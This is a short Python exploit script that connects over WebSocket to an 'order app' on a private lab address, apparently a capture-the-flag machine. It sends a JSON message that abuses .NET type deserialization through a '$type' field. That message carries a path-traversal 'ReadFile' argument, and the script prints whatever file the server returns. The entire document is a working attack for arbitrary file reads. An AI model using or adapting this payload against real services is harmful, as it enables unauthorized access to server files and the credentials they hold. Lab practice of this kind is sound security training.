import websocket,json
import sys

ws = websocket.WebSocket()    

ws.connect("ws://10.10.11.201:5000/") # connect to order app

order = {"RemoveOrder": {"$type": "bagel_server.File, bagel", "ReadFile": f"../../../../../..{sys.argv[1]}"}}

data = str(json.dumps(order))
ws.send(data)

result = ws.recv()
print(json.loads(result))